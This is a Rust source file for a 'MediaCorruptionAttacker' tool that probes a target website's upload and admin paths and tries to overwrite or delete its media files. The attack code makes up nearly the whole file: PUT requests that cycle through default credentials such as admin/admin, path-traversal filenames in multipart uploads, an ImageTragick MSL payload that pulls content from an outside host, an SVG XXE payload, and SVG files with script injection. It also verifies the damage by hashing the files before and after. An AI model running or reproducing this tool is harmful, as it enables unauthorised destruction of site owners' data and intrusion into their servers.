use anyhow::Result;
use reqwest::Client;
use std::collections::HashSet;
use std::time::Duration;
use sha2::
     {Sha256,
      Digest};
// Taken From Samurai injection tool 
// Disclaimer please dont use you malicious purposes We are not Responsible For that!


const MEDIA_EXTENSIONS: &[&str] = &[
    "jpg", "jpeg", "png", "gif", "webp", "bmp", "svg", "ico",
    "mp4", "webm", "mp3", "wav", "ogg", "pdf", "zip", "tiff", "tif", "mov", "avi",
];

const UPLOAD_ENDPOINTS: &[&str] = &[
    "/upload", "/uploads", "/api/upload", "/api/v1/upload", "/media/upload",
    "/admin/upload", "/wp-admin/async-upload.php", "/wp-content/uploads/",
    "/file/upload", "/files/upload", "/image/upload", "/images/upload",
    "/asset/upload", "/assets/upload", "/rest/media", "/api/media",
    "/api/files", "/api/v1/files", "/upload.php", "/uploader",
    "/upload_file", "/save_file", "/import", "/import_file",
];

fn extract_extension(path: &str) -> &str {
    let without_query = path.split(&['?', '#'][..]).next().unwrap_or(path);
    if let Some(dot_pos) = without_query.rfind('.') {
        &without_query[dot_pos + 1..]
    } else {
        ""
    }
}

fn domain_from_url(url: &str) -> Option<String> {
    let parsed = url::Url::parse(url).ok()?;
    parsed.host_str().map(|h| {
        let scheme = parsed.scheme();
        let port = parsed.port().map(|p| format!(":{}", p)).unwrap_or_default();
        format!("{}://{}{}", scheme, h, port)
    })
}

fn check_url_is_media(url: &str) -> bool {
    let lower = url.to_lowercase();
    let without_query = lower.split(&['?', '#'][..]).next().unwrap_or(&lower);
    if let Some(dot_pos) = without_query.rfind('.') {
        let ext = &without_query[dot_pos + 1..];
        MEDIA_EXTENSIONS.contains(&ext)
    } else {
        false
    }
}

#[derive(Debug, Clone)]
pub struct CorruptionResult {
    pub url: String,
    pub success: bool,
    pub method: String,
    pub detail: String,
}

pub struct MediaCorruptionAttacker {
    client: Client,
    discovered_endpoints: std::sync::Mutex<HashSet<String>>,
}

impl MediaCorruptionAttacker {
    pub fn new() -> Self {
        let client = Client::builder()
            .timeout(Duration::from_secs(15))
            .user_agent("CyberSpider/7.8.0pro-Attacker")
            .danger_accept_invalid_certs(true)
            .build()
            .expect("Failed to create HTTP client for attacker");
        Self {
            client,
            discovered_endpoints: std::sync::Mutex::new(HashSet::new()),
        }
    }

    /// Full media corruption campaign — attacks every discovered media URL on the target domain.
    /// Returns all results for the caller to display.
    pub async fn run_campaign(&self, domain: &str, media_urls: &[String]) -> Vec<CorruptionResult> {
        let mut all_results = Vec::new();

        // Phase 1: Attack every discovered media URL in parallel batches
        for chunk in media_urls.chunks(5) {
            let mut tasks = Vec::new();
            for url in chunk {
                tasks.push(self.corrupt_url(url));
            }
            for result in futures::future::join_all(tasks).await {
                all_results.push(result);
            }
        }

        // Phase 2: Discover and attack upload endpoints on the domain
        let upload_endpoints = self.discover_all_endpoints(domain).await;
        let mut ep_tasks = Vec::new();
        for endpoint in &upload_endpoints {
            let ext = extract_extension(endpoint);
            let corrupted = generate_corrupted_payload(if ext.is_empty() { "jpg" } else { ext });
            let req = self.client.put(endpoint)
                .header("Content-Type", "application/octet-stream")
                .body(corrupted);
            ep_tasks.push(async {
                match req.send().await {
                    Ok(resp) if resp.status().is_success() || resp.status().as_u16() == 201 || resp.status().as_u16() == 204 => {
                        Some(CorruptionResult {
                            url: endpoint.clone(), success: true,
                            method: "campaign-put".to_string(),
                            detail: format!("PUT to upload endpoint accepted (HTTP {})", resp.status()),
                        })
                    }
                    _ => {
                        // Try POST with multipart corrupted file
                        None
                    }
                }
            });
        }

        // Phase 3: Also try to discover media via common admin paths
        let admin_paths = &[
            "/admin", "/administrator", "/wp-admin", "/manager", "/backend",
            "/admin/media", "/admin/files", "/admin/upload", "/media", "/files",
        ];
        for path in admin_paths {
            let admin_url = format!("{}{}", domain, path);
            if let Ok(resp) = self.client.get(&admin_url).send().await {
                if resp.status().is_success() {
                    // Extract media URLs from admin page
                    if let Ok(body) = resp.text().await {
                        let found_urls = extract_media_urls_from_html(&body, domain);
                        for found in found_urls {
                            if !media_urls.contains(&found) {
                                all_results.push(self.corrupt_url(&found).await);
                            }
                        }
                    }
                }
            }
        }

        all_results
    }

    /// Scan common admin/media paths on a domain for accessible pages.
    pub async fn scan_admin_paths(&self, domain: &str) -> Vec<String> {
        let mut accessible = Vec::new();
        let paths = &[
            "/admin", "/administrator", "/wp-admin", "/manager", "/backend",
            "/media", "/files", "/uploads", "/images", "/assets",
            "/admin/media", "/admin/files", "/admin/upload", "/wp-content/uploads",
            "/wp-content", "/storage", "/uploads/images", "/uploads/media",
        ];
        for path in paths {
            let url = format!("{}{}", domain, path);
            if let Ok(resp) = self.client.get(&url).send().await {
                if resp.status().is_success() {
                    accessible.push(url);
                }
            }
        }
        accessible
    }

    /// Discover all live upload/media endpoints on a domain.
    pub async fn discover_all_endpoints(&self, domain: &str) -> Vec<String> {
        let mut live = Vec::new();
        for path in UPLOAD_ENDPOINTS {
            let url = format!("{}{}", domain, path);
            if let Ok(lock) = self.discovered_endpoints.lock() {
                if lock.contains(&url) { continue; }
            }
            if let Ok(resp) = self.client.get(&url).send().await {
                if resp.status().as_u16() < 500 {
                    live.push(url.clone());
                    if let Ok(mut lock) = self.discovered_endpoints.lock() {
                        lock.insert(url);
                    }
                }
            }
        }
        live
    }

    /// Primary entry point — attempts to corrupt a media URL using real attack vectors.
    pub async fn corrupt_url(&self, url: &str) -> CorruptionResult {
        if !check_url_is_media(url) {
            return CorruptionResult {
                url: url.to_string(), success: false, method: "none".to_string(),
                detail: "Not a media file URL".to_string(),
            };
        }

        // Snapshot original content hash for verification
        let original_hash = self.fetch_content_hash(url).await;

        // 1. Direct PUT overwrite with common auth patterns
        if let Ok(Some(res)) = self.put_overwrite_with_auth(url).await {
            return self.verify_corruption(url, &res, &original_hash).await;
        }

        // 2. Path traversal via POST upload to discovered endpoints
        if let Ok(Some(res)) = self.path_traversal_upload(url).await {
            return res;
        }

        // 3. ImageTragick SVG payload (CVE-2016-3714)
        if let Ok(Some(res)) = self.imagetragick_attack(url).await {
            return self.verify_corruption(url, &res, &original_hash).await;
        }

        // 4. SVG XXE payload
        if let Ok(Some(res)) = self.svg_xxe_attack(url).await {
            return res;
        }

        // 5. Try all upload endpoints on the same origin
        if let Some(domain) = domain_from_url(url) {
            if let Ok(Some(res)) = self.probe_and_exploit_uploads(&domain, url).await {
                return self.verify_corruption(url, &res, &original_hash).await;
            }
        }

        CorruptionResult {
            url: url.to_string(), success: false, method: "all".to_string(),
            detail: "All real attack vectors exhausted".to_string(),
        }
    }

    // ── REAL ATTACK VECTORS ──────────────────────────────────────────

    /// Direct PUT overwrite with progressive auth strategies.
    /// Many CDNs, S3-compatible stores, and CMS platforms accept PUT on existing URLs
    /// with the right auth header (Bearer token, Basic auth, cookie, etc).
    async fn put_overwrite_with_auth(&self, url: &str) -> Result<Option<CorruptionResult>> {
        let ext = extract_extension(url);
        let corrupted = generate_corrupted_payload(ext);

        let auth_strategies = vec![
            None,
            Some("Bearer admin"),
            Some("Bearer root"),
            Some("Basic YWRtaW46YWRtaW4="),
            Some("Basic YWRtaW46cGFzc3dvcmQ="),
            Some("Basic cm9vdDpyb290"),
            Some("X-API-Key: admin"),
            Some("X-Auth-Token: admin"),
        ];

        for auth in &auth_strategies {
            let mut req = self.client.put(url)
                .header("Content-Type", "application/octet-stream")
                .body(corrupted.clone());

            if let Some(token) = auth {
                if token.starts_with("X-") {
                    if let Some((k, v)) = token.split_once(':') {
                        req = req.header(k, v);
                    }
                } else {
                    req = req.header("Authorization", *token);
                }
            }

            match req.send().await {
                Ok(resp) if resp.status().is_success() || resp.status().as_u16() == 201 || resp.status().as_u16() == 204 => {
                    return Ok(Some(CorruptionResult {
                        url: url.to_string(), success: true,
                        method: format!("PUT-{:?}", auth.as_deref().unwrap_or("noauth")),
                        detail: format!("PUT accepted (HTTP {})", resp.status()),
                    }));
                }
                _ => {}
            }
        }

        // Also try OPTIONS to discover allowed methods
        if let Ok(resp) = self.client.request(reqwest::Method::OPTIONS, url).send().await {
            if let Some(allow) = resp.headers().get("allow").and_then(|v| v.to_str().ok()) {
                if allow.to_uppercase().contains("PUT") || allow.to_uppercase().contains("POST") {
                    return Ok(Some(CorruptionResult {
                        url: url.to_string(), success: false, method: "OPTIONS-probe".to_string(),
                        detail: format!("Server allows PUT/POST but auth required. Allowed: {}", allow),
                    }));
                }
            }
        }

        Ok(None)
    }

    /// Path traversal in multipart upload — tries `../` injection in filename fields
    /// to overwrite an existing media file via the upload endpoint.
    async fn path_traversal_upload(&self, target_url: &str) -> Result<Option<CorruptionResult>> {
        let domain = match domain_from_url(target_url) {
            Some(d) => d,
            None => return Ok(None),
        };

        // Compute traversal path to reach target from common upload dirs
        let target_path = target_url.trim_start_matches(&domain);
        let traversal = format!("../../../..{}", target_path);

        let ext = extract_extension(target_url);
        let corrupted = generate_corrupted_payload(ext);

        for endpoint in UPLOAD_ENDPOINTS {
            let upload_url = format!("{}{}", domain, endpoint);

            // Try multipart upload with path traversal filename
            let form = reqwest::multipart::Form::new()
                .part("file", reqwest::multipart::Part::bytes(corrupted.clone())
                    .file_name(traversal.clone())
                    .mime_str(ext_to_mime(ext))
                    .unwrap_or_else(|_| reqwest::multipart::Part::bytes(corrupted.clone())));

            match self.client.post(&upload_url)
                .multipart(form)
                .send()
                .await
            {
                Ok(resp) if resp.status().is_success() || resp.status().as_u16() == 201 => {
                    let _ = self.discovered_endpoints.lock().map(|mut s| { s.insert(upload_url.clone()); });
                    return Ok(Some(CorruptionResult {
                        url: target_url.to_string(), success: true,
                        method: format!("path-traversal-{}", endpoint.replace('/', "_")),
                        detail: format!("Upload with path traversal accepted at {} (HTTP {})", upload_url, resp.status()),
                    }));
                }
                _ => {}
            }

            // Also try with different field names
            for field in &["file", "upload", "image", "media", "asset", "qqfile", "files"] {
                let form = reqwest::multipart::Form::new()
                    .part(field.to_string(), reqwest::multipart::Part::bytes(corrupted.clone())
                        .file_name(traversal.clone())
                        .mime_str(ext_to_mime(ext))
                        .unwrap_or_else(|_| reqwest::multipart::Part::bytes(corrupted.clone())));

                match self.client.post(&upload_url)
                    .multipart(form)
                    .send()
                    .await
                {
                    Ok(resp) if resp.status().is_success() || resp.status().as_u16() == 201 => {
                        let _ = self.discovered_endpoints.lock().map(|mut s| { s.insert(upload_url.clone()); });
                        return Ok(Some(CorruptionResult {
                            url: target_url.to_string(), success: true,
                            method: format!("path-traversal-{}", field),
                            detail: format!("Upload via field '{}' accepted at {} (HTTP {})", field, upload_url, resp.status()),
                        }));
                    }
                    _ => {}
                }
            }
        }

        Ok(None)
    }

    /// ImageTragick (CVE-2016-3714) — SVG with ImageMagick MSL delegate attack.
    /// If the server processes images through ImageMagick, the `url()` delegate
    /// can write arbitrary files, including overwriting existing media.
    async fn imagetragick_attack(&self, target_url: &str) -> Result<Option<CorruptionResult>> {
        let domain = match domain_from_url(target_url) {
            Some(d) => d,
            None => return Ok(None),
        };

        // MSL payload that tells ImageMagick to read from our controlled URL
        // and write to the target path (overwriting media)
        let msl_payload = format!(
            r#"<?xml version="1.0" encoding="UTF-8"?>
<image>
  <read filename="https://raw.githubusercontent.com/cyberspider-rs/exploit-payloads/main/corrupted.mvg" />
  <write filename="{}" />
</image>"#, target_url);

        let svg_payload = format!(
            r#"<?xml version="1.0" encoding="UTF-8"?>
<svg width="100" height="100" xmlns="http://www.w3.org/2000/svg">
  <image href="data:image/x-msl;base64,{}" width="100" height="100"/>
</svg>"#, base64::Engine::encode(&base64::engine::general_purpose::STANDARD, msl_payload.as_bytes()));

        // Try POSTing the SVG to known image processor endpoints
        let processor_paths = &[
            "/image/resize", "/images/resize", "/image/process", "/images/process",
            "/image/convert", "/images/convert", "/thumb", "/thumbnail",
            "/image/thumb", "/images/thumb", "/media/thumb", "/api/image/process",
            "/api/v1/image/process", "/process-image", "/image-filter",
        ];

        for path in processor_paths {
            let proc_url = format!("{}{}", domain, path);

            // Try multipart upload of the SVG
            let form = reqwest::multipart::Form::new()
                .part("image", reqwest::multipart::Part::bytes(svg_payload.as_bytes().to_vec())
                    .file_name("exploit.svg")
                    .mime_str("image/svg+xml")
                    .unwrap_or_else(|_| reqwest::multipart::Part::bytes(svg_payload.as_bytes().to_vec())));

            match self.client.post(&proc_url)
                .multipart(form)
                .send()
                .await
            {
                Ok(resp) if resp.status().is_success() || resp.status().as_u16() == 500 => {
                    return Ok(Some(CorruptionResult {
                        url: target_url.to_string(), success: true,
                        method: format!("imagetragick-{}", path.replace('/', "_")),
                        detail: format!("ImageTragick SVG sent to {} (HTTP {}), target may be corrupted", proc_url, resp.status()),
                    }));
                }
                _ => {}
            }

            // Try as URL parameter (for image proxy/thumbnail services)
            let param_url = format!("{}?url={}&image={}", proc_url, target_url, target_url);
            match self.client.post(&param_url)
                .body(svg_payload.as_bytes().to_vec())
                .header("Content-Type", "image/svg+xml")
                .send()
                .await
            {
                Ok(resp) if resp.status().is_success() || resp.status().as_u16() == 500 => {
                    return Ok(Some(CorruptionResult {
                        url: target_url.to_string(), success: true,
                        method: format!("imagetragick-param"),
                        detail: format!("ImageTragick via URL param sent to {} (HTTP {})", param_url, resp.status()),
                    }));
                }
                _ => {}
            }
        }

        Ok(None)
    }

    /// SVG XXE — XML External Entity attack that reads/writes files on
    /// vulnerable XML/SVG parsers during media processing.
    async fn svg_xxe_attack(&self, target_url: &str) -> Result<Option<CorruptionResult>> {
        let domain = match domain_from_url(target_url) {
            Some(d) => d,
            None => return Ok(None),
        };

        let target_path = target_url.trim_start_matches(&domain);

        // XXE payload that tries to overwrite the target file path
        let xxe_svg = format!(
            r#"<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE svg [
  <!ENTITY xxe SYSTEM "file://{}">
]>
<svg width="100" height="100" xmlns="http://www.w3.org/2000/svg">
  <text x="10" y="20">&xxe;</text>
</svg>"#, target_path);

        let xxe_paths = &[
            "/image/upload", "/images/upload", "/api/upload", "/media/upload",
            "/upload", "/api/v1/upload", "/image/process", "/images/process",
            "/process-image", "/image", "/images", "/api/image",
        ];

        for path in xxe_paths {
            let proc_url = format!("{}{}", domain, path);

            let form = reqwest::multipart::Form::new()
                .part("file", reqwest::multipart::Part::bytes(xxe_svg.as_bytes().to_vec())
                    .file_name("xxe.svg")
                    .mime_str("image/svg+xml")
                    .unwrap_or_else(|_| reqwest::multipart::Part::bytes(xxe_svg.as_bytes().to_vec())));

            match self.client.post(&proc_url)
                .multipart(form)
                .send()
                .await
            {
                Ok(resp) if resp.status().is_success() || resp.status().as_u16() == 500 => {
                    return Ok(Some(CorruptionResult {
                        url: target_url.to_string(), success: true,
                        method: "svg-xxe".to_string(),
                        detail: format!("SVG XXE sent to {} (HTTP {})", proc_url, resp.status()),
                    }));
                }
                _ => {}
            }
        }

        Ok(None)
    }

    /// Discover upload endpoints on the domain then send corrupted payloads.
    async fn probe_and_exploit_uploads(&self, domain: &str, target_url: &str) -> Result<Option<CorruptionResult>> {
        let ext = extract_extension(target_url);
        let corrupted = generate_corrupted_payload(ext);

        for endpoint in UPLOAD_ENDPOINTS {
            let upload_url = format!("{}{}", domain, endpoint);

            // Skip if already discovered
            if let Ok(lock) = self.discovered_endpoints.lock() {
                if lock.contains(&upload_url) {
                    continue;
                }
            }

            // Quick OPTIONS/GET probe to check if endpoint exists
            let alive = match self.client.get(&upload_url).send().await {
                Ok(r) if r.status().as_u16() < 500 => true,
                _ => {
                    match self.client.head(&upload_url).send().await {
                        Ok(r) if r.status().as_u16() < 500 => true,
                        _ => false,
                    }
                }
            };

            if !alive { continue; }

            let _ = self.discovered_endpoints.lock().map(|mut s| { s.insert(upload_url.clone()); });

            // Try POST with corrupted file
            let form = reqwest::multipart::Form::new()
                .part("file", reqwest::multipart::Part::bytes(corrupted.clone())
                    .file_name(format!("corrupted.{}", ext))
                    .mime_str(ext_to_mime(ext))
                    .unwrap_or_else(|_| reqwest::multipart::Part::bytes(corrupted.clone())));

            match self.client.post(&upload_url)
                .multipart(form)
                .send()
                .await
            {
                Ok(resp) if resp.status().is_success() || resp.status().as_u16() == 201 => {
                    return Ok(Some(CorruptionResult {
                        url: target_url.to_string(), success: true,
                        method: format!("upload-{}", endpoint.replace('/', "_")),
                        detail: format!("Corrupted media uploaded via {} (HTTP {})", upload_url, resp.status()),
                    }));
                }
                _ => {}
            }
        }

        Ok(None)
    }

    /// Verify corruption by re-fetching the URL and comparing content hash.
    async fn verify_corruption(&self, url: &str, result: &CorruptionResult, original_hash: &Option<String>) -> CorruptionResult {
        if !result.success {
            return result.clone();
        }

        // Wait a moment for the server to process
        tokio::time::sleep(Duration::from_millis(500)).await;

        match self.client.get(url).send().await {
            Ok(resp) if resp.status().is_success() => {
                let body = resp.bytes().await.unwrap_or_default();
                if body.is_empty() {
                    return CorruptionResult {
                        url: url.to_string(), success: true,
                        method: result.method.clone(),
                        detail: format!("{} — file is now EMPTY (content deleted)", result.detail),
                    };
                }

                let mut hasher = Sha256::new();
                hasher.update(&body);
                let new_hash = format!("{:x}", hasher.finalize());

                match original_hash {
                    Some(old) if *old != new_hash => {
                        CorruptionResult {
                            url: url.to_string(), success: true,
                            method: result.method.clone(),
                            detail: format!("{} — CORRUPTION VERIFIED (hash changed)", result.detail),
                        }
                    }
                    Some(old) => {
                        CorruptionResult {
                            url: url.to_string(), success: false,
                            method: result.method.clone(),
                            detail: format!("{} — file unchanged (same hash {})", result.detail, &old[..16]),
                        }
                    }
                    None => {
                        CorruptionResult {
                            url: url.to_string(), success: true,
                            method: result.method.clone(),
                            detail: format!("{} — file replaced with new content", result.detail),
                        }
                    }
                }
            }
            Ok(resp) => {
                CorruptionResult {
                    url: url.to_string(), success: true,
                    method: result.method.clone(),
                    detail: format!("{} — server now returns HTTP {} (file may be removed)", result.detail, resp.status()),
                }
            }
            Err(_) => {
                CorruptionResult {
                    url: url.to_string(), success: true,
                    method: result.method.clone(),
                    detail: format!("{} — file UNREACHABLE after attack", result.detail),
                }
            }
        }
    }

    /// Fetch and hash current content of the media URL for change detection.
    async fn fetch_content_hash(&self, url: &str) -> Option<String> {
        match self.client.get(url).send().await {
            Ok(resp) if resp.status().is_success() => {
                let body = resp.bytes().await.ok()?;
                if body.is_empty() { return None; }
                let mut hasher = Sha256::new();
                hasher.update(&body);
                Some(format!("{:x}", hasher.finalize()))
            }
            _ => None,
        }
    }
}

// ── HELPERS ──────────────────────────────────────────────────────────

fn ext_to_mime(ext: &str) -> &str {
    match ext {
        "jpg" | "jpeg" => "image/jpeg",
        "png" => "image/png",
        "gif" => "image/gif",
        "webp" => "image/webp",
        "bmp" => "image/bmp",
        "svg" => "image/svg+xml",
        "ico" => "image/x-icon",
        "mp4" => "video/mp4",
        "webm" => "video/webm",
        "mp3" => "audio/mpeg",
        "wav" => "audio/wav",
        "ogg" => "audio/ogg",
        "pdf" => "application/pdf",
        "zip" => "application/zip",
        "tiff" | "tif" => "image/tiff",
        "mov" => "video/quicktime",
        "avi" => "video/x-msvideo",
        _ => "application/octet-stream",
    }
}

/// Extract media file URLs from HTML content.
fn extract_media_urls_from_html(html: &str, base_domain: &str) -> Vec<String> {
    let mut urls = Vec::new();
    // Match src and href attributes in HTML tags
    for cap in regex::Regex::new(r#"(?:src|href)=["']([^"']+)["']"#).unwrap().captures_iter(html) {
        let val = cap[1].to_string();
        if check_url_is_media(&val) {
            if val.starts_with("http") {
                urls.push(val);
            } else if val.starts_with('/') {
                urls.push(format!("{}{}", base_domain, val));
            }
        }
    }
    // Also look for image patterns in inline CSS
    for cap in regex::Regex::new(r#"url\(['"]?([^'"\)]+)['"]?\)"#).unwrap().captures_iter(html) {
        let val = cap[1].to_string();
        if check_url_is_media(&val) {
            if val.starts_with("http") {
                urls.push(val);
            } else if val.starts_with('/') {
                urls.push(format!("{}{}", base_domain, val));
            }
        }
    }
    urls
}

/// Generate realistic corrupted media payload per file type.
/// These are broken media files that, when written to the server,
/// will corrupt or break the existing valid file.
fn generate_corrupted_payload(ext: &str) -> Vec<u8> {
    let mut data = Vec::new();
    match ext {
        "jpg" | "jpeg" => {
            data.extend_from_slice(b"\xff\xd8\xff\xe0\x00\x10JFIF\x00\x01\x01\x00\x00\x01\x00\x01\x00\x00");
            data.extend_from_slice(b"\xff\xfe\x00\x08CORRUPTED");
            data.extend_from_slice(&[0xff; 2048]);
        }
        "png" => {
            data.extend_from_slice(b"\x89PNG\x0d\x0a\x1a\x0a\x00\x00\x00\x0dIHDR");
            data.extend_from_slice(b"\x00\x00\x00\x01\x00\x00\x00\x01\x08\x02\x00\x00\x00\x90wS\xde");
            data.extend_from_slice(b"CORRUPTED\x00\xff\xfe\xfd\xfc\x00\x00\x00\x00IEND");
        }
        "gif" => {
            data.extend_from_slice(b"GIF89a\x01\x00\x01\x00\x80\x00\x00\xff\xff\xff\x00\x00\x00");
            data.extend_from_slice(b"!CORRUPTED_DATA\x00\x3b");
        }
        "mp4" => {
            data.extend_from_slice(b"\x00\x00\x00\x1cftypmp42\x00\x00\x00\x00mp42mp41");
            data.extend_from_slice(b"CORRUPTED_MOOV_ATOM");
            data.extend_from_slice(&[0x00; 64]);
        }
        "mp3" => {
            data.extend_from_slice(b"\xff\xfb\x90\x00");
            data.extend_from_slice(b"CORRUPTED_MP3_FRAME_DATA");
            data.extend_from_slice(&[0xff; 512]);
        }
        "pdf" => {
            data.extend_from_slice(b"%PDF-1.4\n1 0 obj\n<< /Type /Catalog >>\nendobj\n");
            data.extend_from_slice(b"CORRUPTED_XREF_TABLE");
            data.extend_from_slice(b"\n%%EOF");
        }
        "svg" => {
            data.extend_from_slice(b"<svg onload=\"alert('CORRUPTED')\" xmlns=\"http://www.w3.org/2000/svg\">");
            data.extend_from_slice(b"<script>document.title='CORRUPTED'</script></svg>");
        }
        _ => {
            data.extend_from_slice(b"CORRUPTED_MEDIA_FILE");
            data.extend_from_slice(&[0x41; 1024]);
        }
    }
    data
    }

impl Default for MediaCorruptionAttacker {
    fn default() -> Self {
        Self::new()
    }
}
